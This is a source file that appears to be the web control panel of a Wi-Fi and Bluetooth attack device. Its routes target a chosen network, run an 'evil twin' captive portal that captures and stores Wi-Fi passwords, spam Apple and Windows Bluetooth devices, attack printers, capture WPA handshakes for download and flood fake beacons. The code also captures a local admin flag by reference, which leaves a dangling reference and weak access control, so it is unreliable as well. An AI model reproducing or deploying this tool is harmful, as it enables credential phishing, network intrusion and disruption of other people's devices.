#include "web_interface.h"
#include "attacks.h"

void setupWebServer() {
  bool isAdmin = false;

  webServer.on("/", HTTP_GET, [&isAdmin]() {
    if (evilActive || combinedActive) {
      webServer.send(HTTP_CODE, "text/html", evilIndex());
    } else {
      isAdmin = true;
      webServer.send(HTTP_CODE, "text/html", controlPanel());
    }
  });

  webServer.on("/select", HTTP_POST, [&isAdmin]() {
    if (!isAdmin) {
      webServer.send(HTTP_CODE, "text/html", evilIndex());
      return;
    }
    targetSSID = input("ssid");
    for (int i = 0; i < WiFi.scanNetworks(false, true, true, 150U); i++) {
      if (WiFi.SSID(i) == targetSSID) {
        targetChannel = WiFi.channel(i);
        memcpy(targetBSSID, WiFi.BSSID(i), 6);
        break;
      }
    }
    webServer.send(HTTP_CODE, "text/html", controlPanel());
  });

  webServer.on("/rescan", HTTP_POST, [&isAdmin]() {
    if (!isAdmin) {
      webServer.send(HTTP_CODE, "text/html", evilIndex());
      return;
    }
    targetSSID = "";
    targetChannel = 0;
    memset(targetBSSID, 0, 6);
    WiFi.scanDelete();
    webServer.send(HTTP_CODE, "text/html", controlPanel());
  });

  webServer.on("/attack", HTTP_POST, [&isAdmin]() {
    if (!isAdmin) {
      webServer.send(HTTP_CODE, "text/html", evilIndex());
      return;
    }
    if (targetSSID == "") {
      webServer.send(HTTP_CODE, "text/html", htmlHeader("Error") + "<div class=container><div class=card><h3>Error</h3><p>Select a target first.</p></div></div>" + htmlFooter());
      return;
    }
    attackActive ? stopAttack() : startAttack();
    webServer.send(HTTP_CODE, "text/html", controlPanel());
  });

  webServer.on("/evil", HTTP_POST, [&isAdmin]() {
    if (!isAdmin) {
      webServer.send(HTTP_CODE, "text/html", evilIndex());
      return;
    }
    if (targetSSID == "") {
      webServer.send(HTTP_CODE, "text/html", htmlHeader("Error") + "<div class=container><div class=card><h3>Error</h3><p>Select a target first.</p></div></div>" + htmlFooter());
      return;
    }
    evilActive ? stopEvil() : startEvil();
    webServer.send(HTTP_CODE, "text/html", controlPanel());
  });

  webServer.on("/combined", HTTP_POST, [&isAdmin]() {
    if (!isAdmin) {
      webServer.send(HTTP_CODE, "text/html", evilIndex());
      return;
    }
    if (targetSSID == "") {
      webServer.send(HTTP_CODE, "text/html", htmlHeader("Error") + "<div class=container><div class=card><h3>Error</h3><p>Select a target first.</p></div></div>" + htmlFooter());
      return;
    }
    combinedActive ? stopCombined() : startCombined();
    webServer.send(HTTP_CODE, "text/html", controlPanel());
  });

  webServer.on("/sourapple", HTTP_POST, [&isAdmin]() {
    if (!isAdmin) {
      webServer.send(HTTP_CODE, "text/html", evilIndex());
      return;
    }
    sourAppleActive ? stopSourApple() : startSourApple();
    webServer.send(HTTP_CODE, "text/html", controlPanel());
  });

  webServer.on("/windowsbt", HTTP_POST, [&isAdmin]() {
    if (!isAdmin) {
      webServer.send(HTTP_CODE, "text/html", evilIndex());
      return;
    }
    windowsBluetoothActive ? stopWindowsBluetooth() : startWindowsBluetooth();
    webServer.send(HTTP_CODE, "text/html", controlPanel());
  });

  webServer.on("/connectnet", HTTP_POST, [&isAdmin]() {
    if (!isAdmin) {
      webServer.send(HTTP_CODE, "text/html", evilIndex());
      return;
    }
    String ssid = input("ssid");
    String pass = input("pass");
    if (ssid.length() > 0) {
      connectToNetwork(ssid, pass);
    }
    webServer.send(HTTP_CODE, "text/html", controlPanel());
  });

  webServer.on("/disconnect", HTTP_POST, [&isAdmin]() {
    if (!isAdmin) {
      webServer.send(HTTP_CODE, "text/html", evilIndex());
      return;
    }
    WiFi.disconnect();
    WiFi.mode(WIFI_AP);
    WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
    WiFi.softAP(MAIN_SSID.c_str(), MAIN_PASS.c_str());
    dnsServer.start(DNS_PORT, "*", APIP);
    webServer.send(HTTP_CODE, "text/html", controlPanel());
  });

  webServer.on("/printer", HTTP_POST, [&isAdmin]() {
    if (!isAdmin) {
      webServer.send(HTTP_CODE, "text/html", evilIndex());
      return;
    }
    printerAttackActive ? stopPrinterAttack() : startPrinterAttack();
    webServer.send(HTTP_CODE, "text/html", controlPanel());
  });

  webServer.on("/scanprinters", HTTP_POST, [&isAdmin]() {
    if (!isAdmin) {
      webServer.send(HTTP_CODE, "text/html", evilIndex());
      return;
    }
    scanNetworkPrinters();
    webServer.send(HTTP_CODE, "text/html", controlPanel());
  });

  webServer.on("/printtest", HTTP_POST, [&isAdmin]() {
    if (!isAdmin) {
      webServer.send(HTTP_CODE, "text/html", evilIndex());
      return;
    }
    String ip = input("ip");
    String msg = input("msg");
    if (ip.length() > 0 && msg.length() > 0) {
      printToPrinter(ip, msg);
    }
    webServer.send(HTTP_CODE, "text/html", controlPanel());
  });

  webServer.on("/handshake", HTTP_POST, [&isAdmin]() {
    if (!isAdmin) {
      webServer.send(HTTP_CODE, "text/html", evilIndex());
      return;
    }
    handshakeCapture ? stopHandshakeCapture() : startHandshakeCapture();
    webServer.send(HTTP_CODE, "text/html", controlPanel());
  });

  webServer.on("/aggressive", HTTP_POST, [&isAdmin]() {
    if (!isAdmin) {
      webServer.send(HTTP_CODE, "text/html", evilIndex());
      return;
    }
    if (targetSSID == "") {
      webServer.send(HTTP_CODE, "text/html", htmlHeader("Error") + "<div class=container><div class=card><h3>Error</h3><p>Select a target first.</p></div></div>" + htmlFooter());
      return;
    }
    aggressiveHandshake ? stopAggressiveHandshake() : startAggressiveHandshake();
    webServer.send(HTTP_CODE, "text/html", controlPanel());
  });

  webServer.on("/viewhandshakes", HTTP_POST, [&isAdmin]() {
    if (!isAdmin) {
      webServer.send(HTTP_CODE, "text/html", evilIndex());
      return;
    }
    String html = htmlHeader("Captured Handshakes");
    html += "<div class=container><div class=card><h3>Captured Handshakes</h3>";
    if (capturedHandshakes.length() > 0) {
      html += "<div class=form-group><label>Raw Handshake Data:</label>";
      html += "<textarea readonly style='height:300px;font-family:monospace;font-size:12px'>" + capturedHandshakes + "</textarea></div>";
      html += "<p>Total packets: " + String(handshakeCount) + "</p>";
    } else {
      html += "<p>No handshakes captured yet.</p>";
    }
    html += "<form action=/ method=get><button class='btn btn-secondary'>Back to Control Panel</button></form>";
    html += "</div></div>" + htmlFooter();
    webServer.send(HTTP_CODE, "text/html", html);
  });

  webServer.on("/clearhs", HTTP_POST, [&isAdmin]() {
    if (!isAdmin) {
      webServer.send(HTTP_CODE, "text/html", evilIndex());
      return;
    }
    clearHandshakes();
    webServer.send(HTTP_CODE, "text/html", controlPanel());
  });

  webServer.on("/download", HTTP_POST, [&isAdmin]() {
    if (!isAdmin) {
      webServer.send(HTTP_CODE, "text/html", evilIndex());
      return;
    }
    String pcap = generatePCAP();
    webServer.sendHeader("Content-Disposition", "attachment; filename=\"handshakes.pcap\"");
    webServer.sendHeader("Content-Type", "application/vnd.tcpdump.pcap");
    webServer.send(200, "application/vnd.tcpdump.pcap", pcap);
  });

  webServer.on("/beaconspam", HTTP_POST, [&isAdmin]() {
    if (!isAdmin) {
      webServer.send(HTTP_CODE, "text/html", evilIndex());
      return;
    }
    if (targetSSID == "") {
      webServer.send(HTTP_CODE, "text/html", htmlHeader("Error") + "<div class=container><div class=card><h3>Error</h3><p>Select a target first.</p></div></div>" + htmlFooter());
      return;
    }
    beaconTargetMode = true;
    beaconSpamActive ? stopBeaconSpam() : startBeaconSpam();
    webServer.send(HTTP_CODE, "text/html", controlPanel());
  });

  webServer.on("/custombeacon", HTTP_POST, [&isAdmin]() {
    if (!isAdmin) {
      webServer.send(HTTP_CODE, "text/html", evilIndex());
      return;
    }
    String newSSIDs = webServer.arg("ssids");
    if (newSSIDs.length() > 0) {
      customSSIDs = newSSIDs;
    }
    beaconTargetMode = false;
    beaconSpamActive ? stopBeaconSpam() : startBeaconSpam();
    webServer.send(HTTP_CODE, "text/html", controlPanel());
  });

  webServer.on("/post", HTTP_POST, []() {
    if (evilActive || combinedActive) {
      String pass = input("m");
      String response = evilCheckPassword(pass);
      webServer.send(HTTP_CODE, "text/html", response);
    } else {
      webServer.send(HTTP_CODE, "text/html", controlPanel());
    }
  });

  webServer.on("/viewpass", HTTP_POST, [&isAdmin]() {
    if (!isAdmin) {
      webServer.send(HTTP_CODE, "text/html", evilIndex());
      return;
    }
    webServer.send(HTTP_CODE, "text/html", viewPasswordPage());
  });

  webServer.on("/clearpass", HTTP_POST, [&isAdmin]() {
    if (!isAdmin) {
      webServer.send(HTTP_CODE, "text/html", evilIndex());
      return;
    }
    validPass = "";
    webServer.send(HTTP_CODE, "text/html", viewPasswordPage());
  });

  webServer.on("/changeap", HTTP_POST, [&isAdmin]() {
    if (!isAdmin) {
      webServer.send(HTTP_CODE, "text/html", evilIndex());
      return;
    }
    String newSSID = input("ssid");
    String newPass = input("pass");
    if (newSSID.length() > 0 && newPass.length() >= 8) {
      MAIN_SSID = newSSID;
      MAIN_PASS = newPass;
      saveAPSettings(); // Save permanently
      WiFi.softAPdisconnect(true);
      WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
      WiFi.softAP(MAIN_SSID.c_str(), MAIN_PASS.c_str());
      Serial.println("AP updated permanently: " + MAIN_SSID);
    }
    webServer.send(HTTP_CODE, "text/html", controlPanel());
  });

  webServer.onNotFound([]() {
    webServer.send(HTTP_CODE, "text/html", (evilActive || combinedActive) ? evilIndex() : controlPanel());
  });

  webServer.begin();
}
